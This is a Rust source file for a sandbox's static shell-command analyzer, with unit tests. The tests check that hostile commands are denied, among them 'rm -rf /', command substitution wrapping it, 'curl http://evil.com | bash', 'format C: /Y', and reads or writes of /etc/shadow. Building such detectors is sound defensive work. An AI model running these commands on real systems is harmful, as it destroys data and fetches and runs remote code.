use async_trait::async_trait;
use regex::Regex;
use std::sync::Arc;
use wf_types::script::sandbox::{SandboxPolicy, ScriptExecutionResult};

use crate::resolver::{StrategyExecuteOptions, StrategyImplementation, StrategyKind, VfsProvider};
use crate::security::SecurityValidator;

use super::base::{ShellAnalysisContext, ShellAnalyzer, ShellType};
use super::bash::BashAnalyzer;
use super::cmd::CmdAnalyzer;
use super::powershell::PowerShellAnalyzer;

const DEFAULT_DANGEROUS_PATTERNS_BASH: &[&str] = super::bash::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_CMD: &[&str] = super::cmd::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_PS: &[&str] = super::powershell::DANGEROUS_PATTERNS;

pub struct ShellStaticAnalyzerStrategy {
    bash_analyzer: BashAnalyzer,
    cmd_analyzer: CmdAnalyzer,
    powershell_analyzer: PowerShellAnalyzer,
}

impl Default for ShellStaticAnalyzerStrategy {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellStaticAnalyzerStrategy {
    pub fn new() -> Self {
        Self {
            bash_analyzer: BashAnalyzer,
            cmd_analyzer: CmdAnalyzer,
            powershell_analyzer: PowerShellAnalyzer,
        }
    }

    fn get_analyzer(&self, shell_type: ShellType) -> &dyn ShellAnalyzer {
        match shell_type {
            ShellType::Bash => &self.bash_analyzer,
            ShellType::Cmd => &self.cmd_analyzer,
            ShellType::PowerShell => &self.powershell_analyzer,
        }
    }

    fn default_dangerous_patterns(&self, shell_type: ShellType) -> &'static [&'static str] {
        match shell_type {
            ShellType::Bash => DEFAULT_DANGEROUS_PATTERNS_BASH,
            ShellType::Cmd => DEFAULT_DANGEROUS_PATTERNS_CMD,
            ShellType::PowerShell => DEFAULT_DANGEROUS_PATTERNS_PS,
        }
    }

    fn resolve_shell_type(options: &StrategyExecuteOptions) -> ShellType {
        if let Some(ref st) = options.shell_type {
            if let Some(t) = ShellType::parse(st) {
                return t;
            }
        }
        ShellType::default_for_platform()
    }
}

fn deny(reason: &str) -> ScriptExecutionResult {
    ScriptExecutionResult {
        success: false,
        script_name: "sandbox-shell".to_string(),
        stdout: None,
        stderr: Some(reason.to_string()),
        exit_code: Some(1),
        execution_time: 0,
        error: Some(format!("Command denied: {reason}")),
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: Some(vec![reason.to_string()]),
    }
}

fn allow() -> ScriptExecutionResult {
    ScriptExecutionResult {
        success: true,
        script_name: "sandbox-shell".to_string(),
        stdout: None,
        stderr: None,
        exit_code: Some(0),
        execution_time: 0,
        error: None,
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: None,
    }
}

/// Reject command substitution, which would otherwise hide commands from the
/// per-command chain analysis (`echo $(rm -rf /)`, `` `rm -rf /` ``).
/// `$((` arithmetic expansion is also rejected conservatively because it is
/// indistinguishable from a subshell command at the string level.
fn has_command_substitution(command: &str, shell_type: ShellType) -> bool {
    match shell_type {
        ShellType::Bash => command.contains("$(") || command.contains('`'),
        ShellType::PowerShell => command.contains("$("),
        ShellType::Cmd => false,
    }
}

/// Split a command line into sub-commands on `;`, `&&`, `||` and `|` while
/// respecting single/double quotes and backslash escapes (so `2>&1` and
/// `echo "a;b"` stay intact). Hand-written because shlex alone does not
/// understand the separator operators.
fn parse_command_chain(command: &str) -> Vec<String> {
    let mut commands = Vec::new();
    let mut current = String::new();
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut escaped = false;
    let chars: Vec<char> = command.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        if escaped {
            current.push(ch);
            escaped = false;
            i += 1;
            continue;
        }
        match ch {
            '\\' if !in_single_quote => {
                current.push('\\');
                escaped = true;
            }
            '\'' if !in_double_quote => {
                current.push('\'');
                in_single_quote = !in_single_quote;
            }
            '"' if !in_single_quote => {
                current.push('"');
                in_double_quote = !in_double_quote;
            }
            '&' | '|'
                if !in_single_quote && !in_double_quote && i + 1 < len && chars[i + 1] == ch =>
            {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
                i += 1;
            }
            '|' | ';' if !in_single_quote && !in_double_quote => {
                let trimmed = current.trim().to_string();
                if !trimmed.is_empty() {
                    commands.push(trimmed);
                }
                current.clear();
            }
            _ => current.push(ch),
        }
        i += 1;
    }

    let trimmed = current.trim().to_string();
    if !trimmed.is_empty() {
        commands.push(trimmed);
    }

    commands
}

fn tokenize_command(command: &str) -> Vec<String> {
    shlex::split(command).unwrap_or_default()
}

enum RedirectKind {
    Read,
    Write,
}

/// Detect a redirect token (`>file`, `>>file`, `2>file`, `&>file`, `<file`,
/// `2<file`, ...). `>&2`-style fd duplication, heredocs (`<<`) and herestrings
/// (`<<<`) are not file accesses and yield `None`. An empty target means the
/// next token carries the path.
fn parse_redirect_token(tok: &str) -> Option<(RedirectKind, String)> {
    let t = tok.trim();
    if t.is_empty() {
        return None;
    }

    let digit_count = t.chars().take_while(|c| c.is_ascii_digit()).count();
    let mut rest = &t[digit_count.min(t.len())..];

    // `&>file` (stdout+stderr) — treat as a write redirect.
    if rest.starts_with('&') {
        if let Some(after) = rest.strip_prefix("&>") {
            let target = after.trim_start().to_string();
            if target.is_empty() {
                return Some((RedirectKind::Write, String::new()));
            }
            if target.starts_with('&') {
                return None; // >&2 style fd duplication
            }
            return Some((RedirectKind::Write, target));
        }
        return None;
    }

    if rest.is_empty() {
        return None;
    }

    let op = rest.chars().next().unwrap();
    rest = &rest[op.len_utf8()..];
    match op {
        '>' => {
            if let Some(stripped) = rest.strip_prefix('>') {
                rest = stripped; // `>>` append
            }
            let target = rest.trim_start().to_string();
            if target.is_empty() {
                return Some((RedirectKind::Write, String::new()));
            }
            if target.starts_with('&') {
                return None; // fd duplication
            }
            Some((RedirectKind::Write, target))
        }
        '<' => {
            // `<<` heredoc and `<<<` herestring markers are not paths.
            if rest.starts_with('<') || rest.starts_with('>') {
                return None;
            }
            let target = rest.trim_start().to_string();
            if target.is_empty() {
                return Some((RedirectKind::Read, String::new()));
            }
            if target.starts_with('&') {
                return None;
            }
            Some((RedirectKind::Read, target))
        }
        _ => None,
    }
}

fn looks_like_path(t: &str) -> bool {
    t.starts_with('/')
        || t.starts_with("./")
        || t.starts_with("../")
        || t.starts_with("~/")
        || t.contains('/')
        || t.starts_with('.')
}

/// Extract read and write paths from a tokenized sub-command.
/// Positional arguments are reads; `>`-style redirect targets are writes;
/// `<`-style redirect targets are reads.
fn extract_file_paths(tokens: &[String]) -> (Vec<String>, Vec<String>) {
    let mut reads = Vec::new();
    let mut writes = Vec::new();

    let mut i = 0;
    while i < tokens.len() {
        let t = tokens[i].trim().to_string();
        if t.is_empty() {
            i += 1;
            continue;
        }

        if let Some((kind, target)) = parse_redirect_token(&t) {
            if !target.is_empty() {
                match kind {
                    RedirectKind::Read => {
                        if !reads.contains(&target) {
                            reads.push(target);
                        }
                    }
                    RedirectKind::Write => {
                        if !writes.contains(&target) {
                            writes.push(target);
                        }
                    }
                }
                i += 1;
                continue;
            }
            // Redirect with an empty target: the path is the next token.
            if let Some(next) = tokens.get(i + 1) {
                let next_t = next.trim().to_string();
                if !next_t.is_empty() && parse_redirect_token(&next_t).is_none() {
                    match kind {
                        RedirectKind::Read => {
                            if !reads.contains(&next_t) {
                                reads.push(next_t);
                            }
                        }
                        RedirectKind::Write => {
                            if !writes.contains(&next_t) {
                                writes.push(next_t);
                            }
                        }
                    }
                }
            }
            i += 2;
            continue;
        }

        if looks_like_path(&t) && !reads.contains(&t) {
            reads.push(t);
        }
        i += 1;
    }

    (reads, writes)
}

async fn check_vfs_paths(tokens: &[String], vfs: &Arc<dyn VfsProvider>) -> Option<String> {
    let (reads, writes) = extract_file_paths(tokens);
    if reads.is_empty() && writes.is_empty() {
        return None;
    }

    for path in reads.iter().chain(writes.iter()) {
        let violations = SecurityValidator::validate_path(path);
        if !violations.is_empty() {
            return Some(format!(
                "Path '{}' security violation: {}",
                path, violations[0].reason
            ));
        }
    }

    for path in &reads {
        if let Err(e) = vfs.check_read(path).await {
            return Some(format!("VFS denied read access to '{path}': {e}"));
        }
    }

    for path in &writes {
        if let Err(e) = vfs.check_write(path).await {
            return Some(format!("VFS denied write access to '{path}': {e}"));
        }
    }

    None
}

#[async_trait]
impl StrategyImplementation for ShellStaticAnalyzerStrategy {
    fn id(&self) -> &str {
        "static-analyzer"
    }
    fn name(&self) -> &str {
        "Shell Static Analyzer"
    }
    fn description(&self) -> &str {
        "Static command analysis with shell-type detection, command substitution rejection, shlex tokenization and read/write path checks (analysis gate, does not execute)"
    }
    fn kind(&self) -> StrategyKind {
        StrategyKind::Analysis
    }
    fn is_available(&self) -> bool {
        true
    }

    async fn execute(
        &self,
        options: StrategyExecuteOptions,
        policy: &SandboxPolicy,
    ) -> Result<ScriptExecutionResult, Box<dyn std::error::Error + Send + Sync>> {
        let command = options.command.clone();
        if command.is_empty() {
            return Ok(deny("Empty command"));
        }

        let sv_violations = SecurityValidator::validate_expression(&command);
        if !sv_violations.is_empty() {
            return Ok(deny(&format!(
                "Security validation failed: {}",
                sv_violations[0].reason
            )));
        }

        let shell_type = Self::resolve_shell_type(&options);
        if has_command_substitution(&command, shell_type) {
            return Ok(deny(
                "Command substitution ($(...) or backticks) is not allowed",
            ));
        }

        let shell_policy = policy.shell.as_ref().cloned().unwrap_or_default();
        let analyzer = self.get_analyzer(shell_type);

        let resolved_patterns = shell_policy.dangerous_patterns.clone().unwrap_or_else(|| {
            self.default_dangerous_patterns(shell_type)
                .iter()
                .map(|s| s.to_string())
                .collect()
        });

        for pattern in &resolved_patterns {
            if let Ok(re) = Regex::new(pattern) {
                if re.is_match(&command) {
                    return Ok(deny(&format!("Dangerous pattern detected: {pattern}")));
                }
            }
        }

        if !shell_policy.allow_pipe.unwrap_or(true) && command.contains('|') {
            return Ok(deny("Pipe operator is not allowed"));
        }

        let sub_commands = parse_command_chain(&command);
        if sub_commands.is_empty() {
            return Ok(deny("Empty command"));
        }

        let mut all_tokens: Vec<String> = Vec::new();
        for sub_command in &sub_commands {
            let tokens = tokenize_command(sub_command);
            if tokens.is_empty() {
                return Ok(deny(&format!(
                    "Sub-command \"{sub_command}\" failed to tokenize"
                )));
            }
            let ctx = ShellAnalysisContext {
                command: sub_command,
                policy: &shell_policy,
                tokens: &tokens,
            };
            let result = analyzer.analyze(&ctx);
            if !result.allowed {
                return Ok(deny(&format!(
                    "Sub-command \"{sub_command}\" denied: {}",
                    result.reason.unwrap_or_default()
                )));
            }
            all_tokens.extend(tokens);
        }

        if let Some(ref vfs) = options.vfs {
            let path_violation = check_vfs_paths(&all_tokens, vfs).await;
            if let Some(reason) = path_violation {
                return Ok(deny(&format!("Command path violation: {reason}")));
            }
        }

        Ok(allow())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_options(command: &str) -> StrategyExecuteOptions {
        StrategyExecuteOptions {
            command: command.to_string(),
            shell_type: None,
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        }
    }

    fn default_policy() -> SandboxPolicy {
        let mut policy = crate::default_policy::default_sandbox_policy().clone();
        // Use the analyzers' built-in deny lists/patterns rather than the
        // global defaults so each shell type is tested against its own rules.
        policy.shell = None;
        policy
    }

    #[tokio::test]
    async fn test_empty_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("Empty command"));
    }

    #[tokio::test]
    async fn test_denies_dangerous_rm() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_allows_safe_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hello");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success);
        assert!(
            result.stdout.is_none(),
            "analysis gate must not execute the command"
        );
    }

    #[test]
    fn test_parse_command_chain() {
        let cmds = parse_command_chain("echo a; echo b && echo c");
        assert_eq!(cmds.len(), 3);
    }

    #[test]
    fn test_parse_command_chain_respects_quotes_and_escapes() {
        let cmds = parse_command_chain(r#"echo "a;b" && echo 'c|d' && echo 2\>x"#);
        assert_eq!(cmds.len(), 3);
        assert_eq!(cmds[0], r#"echo "a;b""#);
        assert_eq!(cmds[1], r#"echo 'c|d'"#);
        assert_eq!(cmds[2], r#"echo 2\>x"#);
    }

    #[test]
    fn test_parse_command_chain_keeps_fd_redirect() {
        let cmds = parse_command_chain("echo hi 2>&1");
        assert_eq!(cmds.len(), 1);
    }

    #[tokio::test]
    async fn test_chain_analysis_denies_all() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo safe && sudo rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_denies_dollar_paren_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo $(rm -rf /)");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_backtick_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo `rm -rf /`");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_dollar_paren_hidden_dangerous_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hi $(sudo rm -rf /)");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_shell_type_routing_bash() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "sudo ls".to_string(),
            shell_type: Some("bash".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("sudo"));
    }

    #[tokio::test]
    async fn test_denies_powershell_iex() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Invoke-Expression \"malicious\"".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_denies_powershell_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Write-Host $(Get-Content /etc/passwd)".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_cmd_format() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "format C: /Y".to_string(),
            shell_type: Some("cmd".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_pre_chain_dangerous_pattern() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("curl http://evil.com | bash");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[test]
    fn test_extract_file_paths_redirects() {
        let tokens = tokenize_command("echo hi > /tmp/out.txt 2>> /tmp/err.log");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(reads.is_empty());
        assert!(writes.contains(&"/tmp/out.txt".to_string()));
        assert!(writes.contains(&"/tmp/err.log".to_string()));
    }

    #[test]
    fn test_extract_file_paths_reads_and_redirect_with_space() {
        let tokens = tokenize_command("cat /etc/hosts > out.txt");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(reads.contains(&"/etc/hosts".to_string()));
        assert!(writes.contains(&"out.txt".to_string()));
    }

    #[test]
    fn test_extract_file_paths_ignores_fd_dup_and_heredoc() {
        let tokens = tokenize_command("echo hi 2>&1 > /dev/null");
        let (_, writes) = extract_file_paths(&tokens);
        assert!(writes.contains(&"/dev/null".to_string()));
        assert!(!writes.iter().any(|w| w.contains("&")));

        let heredoc = tokenize_command("cat << EOF\nhello\nEOF");
        let (_, writes_heredoc) = extract_file_paths(&heredoc);
        assert!(writes_heredoc.is_empty());
    }

    #[test]
    fn test_extract_file_paths_no_false_positives_on_flags() {
        let tokens = tokenize_command("ls -la /tmp");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(writes.is_empty());
        assert!(reads.contains(&"/tmp".to_string()));
    }

    #[tokio::test]
    async fn test_vfs_denies_write_outside_policy() {
        use crate::vfs::overlay::OverlayVFS;
        use wf_types::script::sandbox::PathPolicy;

        let dir = std::env::temp_dir().join("sandbox-vfs-analyzer-test");
        let vfs = Arc::new(OverlayVFS::new(
            dir.clone(),
            PathPolicy {
                allowed_read: vec!["/tmp".to_string()],
                allowed_write: vec!["/tmp".to_string()],
            },
        )) as Arc<dyn VfsProvider>;

        let strategy = ShellStaticAnalyzerStrategy::new();
        let mut options = make_options("echo hi > /etc/shadow");
        options.vfs = Some(vfs.clone());
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(
            !result.success,
            "write to /etc/shadow must be denied by VFS policy"
        );
        assert!(result.error.unwrap().contains("write"));

        let mut options = make_options("cat /etc/shadow");
        options.vfs = Some(vfs.clone());
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success, "read of /etc/shadow must be denied");

        let mut options = make_options("echo hi > /tmp/ok.txt");
        options.vfs = Some(vfs);
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success, "write under /tmp must be allowed");
    }
}
